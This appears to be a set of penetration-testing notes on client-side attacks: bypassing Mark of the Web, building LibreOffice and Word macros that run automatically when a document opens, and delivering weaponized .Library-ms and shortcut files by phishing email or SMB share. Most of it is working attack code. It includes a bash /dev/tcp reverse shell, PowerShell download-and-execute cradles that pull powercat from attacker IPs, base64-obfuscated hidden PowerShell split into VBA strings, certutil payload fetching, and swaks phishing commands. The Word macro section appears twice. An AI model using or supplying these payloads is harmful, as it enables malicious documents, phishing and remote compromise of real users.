## Bypassing Mark of the Web (MOTW)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > Password Attacks > Bypassing Mark of the Web (MOTW)`

- Craft emails with pretext to open MS files or download links with Canarytokens embedded.
- Non-NTFS file systems (e.g., FAT32) strip MOTW.
- Container file formats like `.iso`, `.img`, `.vhd`, and `.vhdx` can contain non-NTFS files.


## [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution)`

Reference: [https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)


## [1. Create Macro](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#1.-create-macro)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution) > [1. Create Macro](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#1.-create-macro)`

We can create a macro and embed it into a **LibreOffice** file, like Microsoft Excel.
1. Open one of the LibreOffice applications such as **Calc, Writer**.
2. Save a new empty file at first.
3. Go to **Tools → Macros → Organize Macros → Basic**. The BASIC Macros window opens.
4. In the window, select our new created filename in the left pane, then click **New**. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.
5. In the Macro editor, write our code as below. It’s an example for reverse shell.
```bash
    REM  *****  BASIC  *****
    
    Sub Main
    	Shell("bach -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
    End Sub

# Or for windows

 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.154/powercat.ps1');powercat -c 192.168.45.154 -p 135 -e powershell")
```
6. Now close the editor.


## [2. Embed the Macro to LibreOffice File.](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#2.-embed-the-macro-to-libreoffice-file.)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution) > [2. Embed the Macro to LibreOffice File.](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#2.-embed-the-macro-to-libreoffice-file.)`

After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.
1. Return to the original window on LibreOffice.
2. Go to **Tools → Macros → Organize Macros → Basic** again. The BASIC Macros window opens.
3. Select our new created macro (module) in the left pane. For example,
```bash
    example.odt
        - Standard
    		- Module1 <- select this
```
4. Click **Assign**. The Customize window opens.
5. In Customize window, go to **Events** tab. Then select **Open Document** and click **'Macro…'**. The Macro Selector window opens.
6. In the Macro Selector window, select our new created macro (module), then click OK.
7. Now we should see the text such **"Standard.Module1.Main"** at the right of the **Open Document**. Click **OK**.
8. Save this LibreOffice file again.
9. Finally, we’ve created the file which is executed when the file opens.


## Word Macro Exploitation (Example)

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution) > Word Macro Exploitation (Example)`

1. Create a blank Word document (`.doc` or `.docm` for persistence; `.docx` doesn't persist).
2. `Save & Open` > `View` tab > `Macros` > `View Macro` > Name: `MyMacro`, `Macros in`: `mymacro.doc (document)` > `Create`.
3. In the VBA editor, modify the macro to auto-open and run OS commands to download `powercat` and get a reverse PowerShell shell.
    - Encode `powercat.ps1` (UTF-16LE) and the PowerShell reverse shell using base64.
    - Split the encoded string into smaller parts for the VBA macro.
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
 
n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
4. Run the Python script and paste the output into the VBA macro:
```VBA
Sub AutoOpen()
     MyMacro
End Sub
Sub Document_Open()
     MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
     ...
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```
5. Save the macro-enabled document and send it to the target. Open the document to trigger the reverse shell.
```VBA
## CAN ALSO TRY MSFVENOM PAYLOAD 1. CERTUTIL to get 2. To run payload
Sub AutoOpen()
	revshell
End Sub

Sub Document_Open()
	revshell
End Sub

Sub revshell()
	Dim StrCmd As String
	StrCmd = "certutil.exe -f -urlcache http://10.10.10.10/rev.exe rev.exe"
	CreateObject("Wscript.Shell").Run StrCmd
	Dim StrCmd2 As String
	StrCmd2 = "powershell.exe -nop -c .\rev.exe"
	CreateObject("Wscript.Shell").Run StrCmd2
End Sub
```


## Abusing Windows Library Files

> Source: `01101100-C0D3X-00110110.md` → `Exploitation > [Create Macro to Code Execution](https://exploit-notes.hdks.org/exploit/malware/libreoffice-macros/#create-macro-to-code-execution) > Abusing Windows Library Files`

Weaponize `.Library-ms` files to deliver a shortcut that downloads and executes `powercat` for a reverse shell.

**Requirements:**

- WebDAV server (hosting the `.Library-ms` and shortcut files).
- `.Library-ms` file (in the WebDAV share).
- Shortcut link (`.lnk` file in the WebDAV share) to download and execute `powercat`.
- Python web server (hosting `powercat.ps1`).
- Netcat listener (to catch the shell).

**Steps:**

1. **Start WsgiDAV on port 80:**
```bash
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
2. **Create a `.Library-ms` file:**
```XML
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>[http://192.168.119.2](http://192.168.119.2)</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
> Replace `http://192.168.119.2` with your Kali Linux IP.
3. **Create a shortcut (`.lnk`) file:**
- `New` > `Create Shortcut`.
- Path: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/powercat.ps1'); powercat -c <LHOST> -p 4444 -e powershell"`
> Replace `<LHOST>` with your Kali Linux IP.
3. **Start a Python web server (for `powercat.ps1`):**
```bash
python3 -m http.server 8000
```
4. **Start a Netcat listener:**
```bash
nc -lnvp 4444
```
5. **Place the `.Library-ms` and `.lnk` files in the WebDAV share (`/home/kali/webdav/`).**
6. **Send the `.Library-ms` file to the target (e.g., via phishing email or SMB share).**
    - **Email (using `swaks`):**
```bash
sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.x.199 --body body.txt --header "Subject: Problems" --suppress-data
```
- **SMB Share:**
```bash
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```


## Word Macro Exploitation (Example)

> Source: `01101100-RUN3-00110110.md` → `Exploitation > Password Attacks > Word Macro Exploitation (Example)`

1. Create a blank Word document (`.doc` or `.docm` for persistence; `.docx` doesn't persist).
2. `Save & Open` > `View` tab > `Macros` > `View Macro` > Name: `MyMacro`, `Macros in`: `mymacro.doc (document)` > `Create`.
3. In the VBA editor, modify the macro to auto-open and run OS commands to download `powercat` and get a reverse PowerShell shell.
    - Encode `powercat.ps1` (UTF-16LE) and the PowerShell reverse shell using base64.
    - Split the encoded string into smaller parts for the VBA macro.
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
 
n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
4. Run the Python script and paste the output into the VBA macro:
```VBA
Sub AutoOpen()
     MyMacro
End Sub
Sub Document_Open()
     MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
     ...
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```
5. Save the macro-enabled document and send it to the target. Open the document to trigger the reverse shell.
